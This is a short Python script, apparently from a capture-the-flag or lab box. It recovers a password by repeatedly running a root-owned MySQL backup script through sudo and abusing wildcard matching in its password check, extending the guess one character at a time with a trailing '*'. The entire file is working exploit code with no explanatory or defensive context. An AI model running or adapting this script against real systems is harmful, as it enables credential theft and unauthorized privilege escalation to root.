import subprocess
import string

# The command to run
command = ['sudo', '-u', 'root', '/opt/scripts/mysql-backup.sh']

# The message indicating success
success_message = 'Password confirmed!'

# Function to execute the command and return the result
def check_password(password):
    try:
        process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(input=f"{password}\n")
        return success_message in stdout
    except Exception as e:
        print(f"Error: {e}")
        return False

# Brute-force attempt
def brute_force():
    char_list = string.ascii_lowercase + string.ascii_uppercase + string.digits
    pass_found = ""  # This will hold the progressively found parts of the password
    index = 0  # This will keep track of our position in the char_list
    
    while index < len(char_list):  # Continue until we've tried every character
        char = char_list[index]  # Get the current character from the list
        wildcard_pass = f"{pass_found}{char}*"

        # If wildcard password seems to work
        if check_password(wildcard_pass):  
            pass_found += char  # Add the character to pass_found
            print(f"Partial password found: {pass_found}")
            index = -1  # Reset index to start the next character search from the beginning
            char_list = string.ascii_lowercase + string.ascii_uppercase + string.digits  # Reset the list

            # Now we check without the wildcard
            if check_password(pass_found):
                print(f"Password found: {pass_found}")
                return pass_found

        index += 1  # Move to the next character

    return pass_found if check_password(pass_found) else None

# Start brute-forcing
password = brute_force()

if password:
    print(f"Password is: {password}")
else:
    print("Password could not be found.")

